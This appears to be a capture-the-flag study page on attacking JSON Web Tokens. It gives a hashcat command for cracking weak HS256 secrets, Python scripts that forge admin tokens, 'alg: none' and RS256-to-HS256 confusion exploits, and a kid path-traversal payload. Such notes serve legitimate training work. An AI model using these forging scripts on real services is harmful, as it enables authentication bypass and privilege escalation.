# JWT Abuse

## Category: Web Exploitation
## Topic: JSON Web Token Vulnerabilities

---

## Overview

JWT (JSON Web Token) vulnerabilities are a common web challenge category. This page covers the main attack vectors encountered across HTB, THM, and CTF competitions.

---

## JWT Primer

A JWT has three parts separated by dots:

```
header.payload.signature
```

Example decoded:

```json
// Header
{ "alg": "HS256", "typ": "JWT" }

// Payload
{ "sub": "user123", "role": "user", "iat": 1700000000 }
```

The server trusts the payload **only if the signature is valid** — attacks target the signature verification logic.

---

## THM

### Vulnerability: Weak secret / brute-force

If the secret key is weak, crack it with `hashcat`:

```bash
hashcat -a 0 -m 16500 eyJhbGc...token.here /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

Once the secret is known, forge any payload:

```python
import jwt
secret = "supersecret"
payload = {"sub": "admin", "role": "administrator"}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

---

## HTB

### Vulnerability: `alg: none` attack

Some libraries accept `"alg": "none"` — no signature required:

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "admin", "role": "admin"}).encode())

forged = header + b'.' + payload + b'.'
print(forged.decode())
```

---

## CTF Competitions

### RS256 → HS256 Algorithm Confusion

When the server uses RS256, grab the public key from `/jwks.json` and sign with it as an HS256 secret:

```python
import jwt
public_key = open('pubkey.pem').read()
payload = {"user": "admin", "admin": True}
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

### Kid Header Injection

The `kid` field tells the server which key to use. If unsanitised, point it to a known file:

```json
{ "alg": "HS256", "kid": "../../dev/null" }
```

Then sign with an empty string as the secret.

---

## Quick Reference

| Attack | Condition | Tool |
|--------|-----------|------|
| `alg: none` | Library doesn't validate alg | Manual / Burp |
| Weak secret | Guessable HMAC key | hashcat, jwt-cracker |
| RS256 → HS256 | Public key accessible | PyJWT |
| `kid` injection | Unsanitised kid field | Manual |
| Expiry bypass | `exp` not validated | Manual |

---

## Tools

- [jwt.io](https://jwt.io) — decode/encode in browser
- `hashcat -m 16500` — crack HS256 tokens
- Burp Suite JWT Editor extension
- `PyJWT` — scripting attacks
